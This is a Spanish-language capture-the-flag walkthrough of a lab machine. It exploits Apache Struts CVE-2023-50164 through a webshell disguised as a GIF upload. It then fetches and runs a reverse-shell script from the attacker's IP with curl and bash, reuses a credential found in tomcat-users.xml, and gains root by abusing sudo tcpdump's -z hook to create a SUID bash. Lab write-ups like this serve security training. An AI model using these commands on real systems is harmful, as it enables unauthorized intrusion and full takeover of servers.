![](Assets/Attachments/Pasted%20image%2020251227193318.png)
primero hacemos mkt en el directorio que queramos que se creen las carpetas necesarias para la auditoria


![](Assets/Attachments/Pasted%20image%2020251227193105.png)
luego hacemos un ping a la maquina victima y según el ttl podemos saber si es linux o windows

64 -> linux
128 -> windows

en este caso sale 63 y 62 porque pasamos por la vpn

![697](Assets/Attachments/Pasted%20image%2020251227193712.png)

![](Assets/Attachments/Pasted%20image%2020251227193008.png)
luego hacemos un nmap hacia la maquina victima para que nos muestre puertos abiertos

![Pasted image 20251227193555](Assets/Attachments/Pasted%20image%2020251227193555.png)
después hacemos un nmap mas preciso para que nos muestre version y servicios corriendo en la maquina victima 
Una vez tenemos información mas detallada de la maquina victima, podemos ver que es una pagina web ubuntu que usa nginx, con esta informacion nos dirigimos a la pagina web y nos daremos cuenta que se esta usando Virtual Hosting por lo tanto no podremos acceder a la web, para poder acceder debemos hacer un "binding" de datos para relacionar la url con la ip 
![Pasted image 20251227194601](Assets/Attachments/Pasted%20image%2020251227194601.png)


Podemos probar a conectarnos mediante ssh pero al no tener credenciales no nos va a dejar acceder
![Pasted image 20251227194210|317](Assets/Attachments/Pasted%20image%2020251227194210.png)

Luego de probar que ssh no funciona vamos a inspeccionar la web por si hay algo interesante 

Observamos que es una web que nos permite subir archivos en formato JPG, JPEG, PNG, GIF, si intenamos subir cualquier otro tipo de archivo o nada, nos saltara error
![Pasted image 20251227194853](Assets/Attachments/Pasted%20image%2020251227194853.png)
![Pasted image 20251227195119](Assets/Attachments/Pasted%20image%2020251227195119.png)
![Pasted image 20251227195132](Assets/Attachments/Pasted%20image%2020251227195132.png)


Podemos interceptar la subida de archivos usando Burpsuite, para ello nos dirigimos a la misma
![Pasted image 20251227195302](Assets/Attachments/Pasted%20image%2020251227195302.png)
usamos este comando para ejecutar burpsuite en segundo plano sin tener que depender de la terminal, con ese comando podemos cerrar la terminal y seguir con burpsuite.


En burpsuite nos dirigimos a la pestaña de proxy donde encendemos INTERCEP ON para interceptar todo el trafico de la maquina 
![Pasted image 20251227200013](Assets/Attachments/Pasted%20image%2020251227200013.png)



Para poder usar burpsuite en nuestro buscador preferido he instalado foxyproxy en el cual he creado un proxy para poder interceptar todas las peticiones de la maquina (LOOPBACK -> 127.0.0.1-> localhost )usando burpsuite

![Pasted image 20251227195536](Assets/Attachments/Pasted%20image%2020251227195536.png)

Activamos el Proxy
![Pasted image 20251227195919](Assets/Attachments/Pasted%20image%2020251227195919.png)

EN ESTE CASO observamos que podemos descargar la app
![Pasted image 20251227194750](Assets/Attachments/Pasted%20image%2020251227194750.png)


dentro del pom.xml podemos encontrar la version de struts 6.3.0.1 que es un popular framework de codigo abierto para desarrollar aplicaciones web en java basado en el patron MVC
![Pasted image 20251229132508](Assets/Attachments/Pasted%20image%2020251229132508.png)

Buscamos informacion sobre si existen vulnerabilidades para esta version de struts, encontramos que existen dos vulnerabilidades CVE-2024-53677/CVE-2023–50164 relacionadas con esta version de struts, aunque yo para esta maquina he explotado la #CVE-2023–50164 

AMBAS VULNERABILIDADES SE EXPLOTAN MEDIANTE UN DIRECTORY PATH TRAVERSAL

![Pasted image 20251229134702](Assets/Attachments/Pasted%20image%2020251229134702.png)
![Pasted image 20251229135832](Assets/Attachments/Pasted%20image%2020251229135832.png)
![Pasted image 20251229134958](Assets/Attachments/Pasted%20image%2020251229134958.png)
![Pasted image 20251229135755](Assets/Attachments/Pasted%20image%2020251229135755.png)

Para explotar esta vulnerabilidad he usado 2 archivos de este repositorio los cuales vamos a necesitar : https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE

Vamos a usar el contenido de exploit.py | webshell.jsp...

PERO ANTES DE NADA DEBEMOS INSTALAR LOS PAQUETES REQUERIDOS PARA EL EXPLOIT
![Pasted image 20251229144121](Assets/Attachments/Pasted%20image%2020251229144121.png)
si los intentamos instalar de la forma tradicional con pip, pip3, pipx requests-toolbelt nos va a saltar un error
![Pasted image 20251229144310](Assets/Attachments/Pasted%20image%2020251229144310.png)
para que no salte este error la mejor forma de instalar los paquetes debemos crear y lanzar un entorno virtual para que no se rompa nuestra VM , para ello ejecutamos estos comandos: 
`python3 -m venv mi_entorno`
`source mi_entorno/bin/activate`


yo en base a estos dos archivos del repositorio de github he creado 2 archivos con el mismo nombre en la carpeta content y los he modificado segun lo que necesitaba, en mi caso lo que hecho es hacer pasar el webshell.jsp por un archivo gif para que acepte la subida del archivo

Para ejecutar el archivo malicioso en la maquina victima ejecutamos el siguiente comando que envia el archivo a la url de subida de archivos de la web 
![Pasted image 20251229145254](Assets/Attachments/Pasted%20image%2020251229145254.png)

Si el exploit se ha ejecutado correctamente entonces nos mostrara la web shell de la pagina donde podemos ejecutar `lsb_release -a` para confirmar que la version de ubuntu que nos mostraba nmap es correcta, al hacer un whoami nos mostrara que somos el usuario tomcat, ademas podemos hacer un ipconfig o hostname -I , EN esta web shell no encontraremos nada de valor pero vamos a ejecutar un reverse shell para acceder a la terminal del servidor, 

![Pasted image 20251229151141](Assets/Attachments/Pasted%20image%2020251229151141.png)
![Pasted image 20251229151207](Assets/Attachments/Pasted%20image%2020251229151207.png)


Vamos a probar reverse shell a ver cual nos funciona en este caso, antes de hacer la reverse shell debemos ponernos en escucha en otra terminal por el puerto 443 en mi caso, para esto haremos uso de este comando: 
![Pasted image 20251229151522](Assets/Attachments/Pasted%20image%2020251229151522.png)
![Pasted image 20251229151605](Assets/Attachments/Pasted%20image%2020251229151605.png)

luego en la web shell probaremos diferentes reverse shell hasta dar con la que nos permita conectar a la shell del servidor 

![Pasted image 20251229151759](Assets/Attachments/Pasted%20image%2020251229151759.png)
(10.10.14.193 es la ip de la vpn | 443 es el puerto que esta en escucha en la otra terminal donde queremos que se muestre la shell del servidor al hacer la reverse shell)
![Pasted image 20251229151820](Assets/Attachments/Pasted%20image%2020251229151820.png)


si ninguna de las que probamos directamente en la web shell nos funciona entonces "forzaremos" a la web shell a que ejecute un archvio que contendra la reverse shell, para esto nos montamos un servidor en python3 por el puerto 80 el cual recibira peticiones 
![Pasted image 20251229152428](Assets/Attachments/Pasted%20image%2020251229152428.png)
![Pasted image 20251229152520](Assets/Attachments/Pasted%20image%2020251229152520.png)

una vez hecho el paso anterior ejecutamos los siguientes comandos los cuales crearan 
![Pasted image 20251229152403](Assets/Attachments/Pasted%20image%2020251229152403.png)

`curl 10.10.14.193/shell.sh -o /tmp/reverse`

- **Acción:** Descarga el mismo archivo pero esta vez lo guarda en el disco del servidor, específicamente en la ruta `/tmp/reverse`, usando la bandera `-o` (output).

`bash /tmp/reverse`

- **Acción:** Intenta ejecutar el archivo guardado invocando `bash` explícitamente. Esto suele funcionar aunque el archivo no tenga permisos `+x`.

Luego de ejecutar este ultimo comando veremos lo siguiente en el puerto 443 que estaba en escucha : ![Pasted image 20251229153315](Assets/Attachments/Pasted%20image%2020251229153315.png)
La reverse shell se ha ejecutado correctamente en la maquina victima y ahora estamos en la shell del servidor, entonces nos pondremos a buscar cosas de valor por los directorios. 
![Pasted image 20251229153716](Assets/Attachments/Pasted%20image%2020251229153716.png)
En mi caso luego de una larga busqueda he encontrado una contraseña en el archivo tomcat-users.xml: ![Pasted image 20251229153820](Assets/Attachments/Pasted%20image%2020251229153820.png)
Tambien en usuarios encontramos a james del cual no tenemos la contraseña pero podemos probar con la contraseña que acabamos de encontrar por si reutiliza, cosa que es muy comun, entonces ejecutamos `su james` para cambiar de usuario pero nos da error de autenticacion 
![Pasted image 20251229154329](Assets/Attachments/Pasted%20image%2020251229154329.png)
(el error de autenticación se be a que esta deshabilitado el permiso SUID o set user ID )
pero al probar por ssh si nos va a dejar acceder a la maquina victima como el usuario james al usar esa contraseña
![Pasted image 20251229160211](Assets/Attachments/Pasted%20image%2020251229160211.png)
ahora podremos ver la flag del usuario
![Pasted image 20251229160237](Assets/Attachments/Pasted%20image%2020251229160237.png)

podemos ver los permisos sudo que tiene el usuario james
![Pasted image 20251229160539](Assets/Attachments/Pasted%20image%2020251229160539.png)
Esto muestra que el usuario `james` puede ejecutar **`tcpdump` como root sin contraseña** (`NOPASSWD`). Este es el vector de ataque.

su id/grupos
![Pasted image 20251229160650](Assets/Attachments/Pasted%20image%2020251229160650.png)

para acceder al usuario root vamos a ejecutar los siguientes comandos para aprobechar que podemos ejecutar /usr/bin/tcpdump sin contraseña 

![Pasted image 20251229160907](Assets/Attachments/Pasted%20image%2020251229160907.png)
El primer comando escribe un script que:
- Copia `/bin/bash` a `/tmp/rootbash`
- Le pone el bit **SUID** (`+xs`) → cualquier usuario que lo ejecute tendrá permisos de root
y bingo ahora estamos dentro del usuario root

chmod +x /tmp/pe.sh -> le damos permisos de ejecucion al script

sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/pe.sh -Z root
- `-G 1` → rota el archivo de captura cada 1 segundo
- `-z /tmp/pe.sh` → **ejecuta ese script al rotar** (postrotate hook)
- Como tcpdump corre como **root**, el script se ejecuta como root

/tmp/rootbash -p -> ejecutamos la shell de root manteniendo sus privilegios

nos movemos al directorio root y veremos la flag 
![Pasted image 20251229160947](Assets/Attachments/Pasted%20image%2020251229160947.png)
![Pasted image 20251229161029](Assets/Attachments/Pasted%20image%2020251229161029.png)

FIN DE LA MAQUINA
